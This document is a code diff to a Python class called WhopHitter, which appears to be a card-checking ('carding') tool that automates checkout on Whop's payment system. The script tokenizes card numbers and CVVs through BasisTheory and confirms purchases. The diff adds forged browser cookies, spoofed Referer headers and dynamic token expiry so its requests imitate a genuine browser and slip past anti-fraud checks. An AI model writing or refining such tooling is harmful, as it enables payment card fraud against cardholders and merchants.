@@ -12,6 +12,7 @@ import base64
 import random
 import hashlib
 import asyncio
+from datetime import datetime, timedelta, timezone
 from typing import Dict, Optional, Tuple
 from urllib.parse import urljoin, urlparse, parse_qs
 from curl_cffi.requests import AsyncSession
@@ -458,10 +459,14 @@ class WhopHitter:
                 else:
                     card_data["cvc"] = raw_cvv
 
+                # Dynamic vault expiration (1 hour window as real BasisTheory element emits)
+                now_utc = datetime.now(timezone.utc)
+                token_expires_at = (now_utc + timedelta(hours=1)).strftime("%Y-%m-%dT%H:%M:%S.000Z")
+
                 token_body = {
                     "type": "card",
                     "containers": [f"/card-assembly/{container_hash}/"],
-                    "expiresAt": "2026-08-28T16:00:00.000Z",
+                    "expiresAt": token_expires_at,
                     "data": card_data,
                 }
 
@@ -473,6 +478,7 @@ class WhopHitter:
                         "bt-device-info": bt_device_info,
                         "Content-Type": "application/json",
                         "Origin": "https://js.basistheory.com",
+                        "Referer": f"https://js.basistheory.com/web-elements/2.12.2/hosted-elements/data-element.html?element_id={account_id}",
                         "User-Agent": UA,
                     },
                     json=token_body,
@@ -486,10 +492,23 @@ class WhopHitter:
 
                 token_id = r_tok.json().get("id")
 
+                # Seed native Whop browser cookies and referer
+                whop_checkout_url = f"https://whop.com/checkout/{plan_id or ch_config}/?session={checkout_id}"
+                whop_cookie_header = (
+                    f"NEXT_LOCALE=en; whop-theme-resolved=dark; _whop_ssk={ssk}; "
+                    f"whop_checkout_key_{checkout_id}={client_secret_full}"
+                )
+                session_headers = {
+                    **whop_headers,
+                    "X-Ssk": ssk,
+                    "Referer": whop_checkout_url,
+                    "Cookie": whop_cookie_header,
+                }
+
                 # ── 5. Bind Payment Method Session in Whop ───────────────────
                 await sess.post(
                     f"{WHOP_API_BASE}/payment_method_types/card/session",
-                    headers={**whop_headers, "X-Ssk": ssk},
+                    headers=session_headers,
                     json={"account_id": account_id, "nonce": nonce},
                     timeout=15
                 )
@@ -530,9 +549,8 @@ class WhopHitter:
                 r_ct = await sess.post(
                     f"{WHOP_API_BASE}/confirmation_tokens",
                     headers={
-                        **whop_headers,
+                        **session_headers,
                         "Authorization": "Bearer public",
-                        "X-Ssk": ssk,
                     },
                     json=conf_token_body,
                     timeout=20
@@ -555,7 +573,7 @@ class WhopHitter:
 
                 r_confirm = await sess.post(
                     f"{WHOP_API_BASE}/checkout_sessions/{checkout_id}/confirm",
-                    headers={**whop_headers, "X-Ssk": ssk},
+                    headers=session_headers,
                     json=confirm_body,
                     timeout=30
                 )
@@ -569,7 +587,7 @@ class WhopHitter:
                         r_poll = await sess.get(
                             f"{WHOP_API_BASE}/checkout_sessions/{checkout_id}",
                             params={"client_secret": client_secret_full},
-                            headers={**whop_headers, "X-Ssk": ssk},
+                            headers=session_headers,
                             timeout=20
                         )
                         poll_text = r_poll.text if hasattr(r_poll, 'text') else str(r_poll.content)
